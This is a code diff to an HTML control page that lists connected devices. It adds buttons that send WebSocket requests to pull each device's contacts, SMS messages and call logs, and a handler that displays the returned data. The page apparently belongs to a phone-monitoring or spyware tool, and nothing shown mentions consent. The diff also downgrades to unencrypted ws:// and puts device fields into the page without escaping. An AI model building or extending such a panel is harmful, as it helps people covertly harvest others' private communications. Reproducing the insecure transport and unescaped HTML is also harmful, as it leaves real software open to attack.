@@ -22,6 +22,22 @@
     }
     .online { color: green; font-weight: bold; }
     .offline { color: red; font-weight: bold; }
+    .btn {
+      padding: 0.4rem 0.8rem;
+      margin: 0.2rem;
+      background: #007bff;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    .data-output {
+      margin-top: 0.5rem;
+      background: #eee;
+      padding: 0.5rem;
+      border-radius: 4px;
+      white-space: pre-wrap;
+    }
   </style>
 </head>
 <body>
@@ -29,9 +45,8 @@
   <div id="deviceList">Loading...</div>
 
   <script>
-    // Dynamically choose WebSocket protocol based on page protocol
-    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-    const socket = new WebSocket(`${protocol}//${location.host}`);
+    const socket = new WebSocket(`ws://${location.host}`);
+    const outputMap = new Map();
 
     socket.addEventListener('open', () => {
       console.log('Connected to backend');
@@ -40,9 +55,11 @@
 
     socket.addEventListener('message', (event) => {
       const message = JSON.parse(event.data);
+
       if (message.type === 'deviceList') {
         const container = document.getElementById('deviceList');
         container.innerHTML = '';
+
         if (message.data.length === 0) {
           container.innerHTML = '<p>No devices connected</p>';
           return;
@@ -51,28 +68,34 @@
         message.data.forEach((device) => {
           const el = document.createElement('div');
           el.className = 'device';
+          const outputId = `output-${device.id}`;
           el.innerHTML = `
             <div><strong>ID:</strong> ${device.id}</div>
             <div><strong>Status:</strong> <span class="${device.online ? 'online' : 'offline'}">${device.online ? 'Online' : 'Offline'}</span></div>
             <div><strong>Last Seen:</strong> ${device.lastSeen}</div>
+            <button class="btn" onclick="requestData('${device.id}', 'contacts')">Get Contacts</button>
+            <button class="btn" onclick="requestData('${device.id}', 'sms')">Get SMS</button>
+            <button class="btn" onclick="requestData('${device.id}', 'calls')">Get Call Logs</button>
+            <div id="${outputId}" class="data-output"></div>
           `;
           container.appendChild(el);
         });
       }
+
+      if (message.type === 'dataResponse') {
+        const { deviceId, dataType, payload } = message;
+        const output = document.getElementById(`output-${deviceId}`);
+        output.textContent = `${dataType.toUpperCase()}\n` + JSON.stringify(payload, null, 2);
+      }
     });
 
-    // Add error handling for the WebSocket connection
-    socket.addEventListener('error', (error) => {
-      console.error('WebSocket error:', error);
-      document.getElementById('deviceList').innerHTML = 
-        '<p style="color: red">Error connecting to server. Please check console for details.</p>';
-    });
-
-    socket.addEventListener('close', () => {
-      console.log('WebSocket connection closed');
-      document.getElementById('deviceList').innerHTML = 
-        '<p>Connection to server lost. Please refresh the page to reconnect.</p>';
-    });
+    function requestData(deviceId, dataType) {
+      socket.send(JSON.stringify({
+        type: 'requestData',
+        targetId: deviceId,
+        dataType: dataType
+      }));
+    }
   </script>
 </body>
 </html>
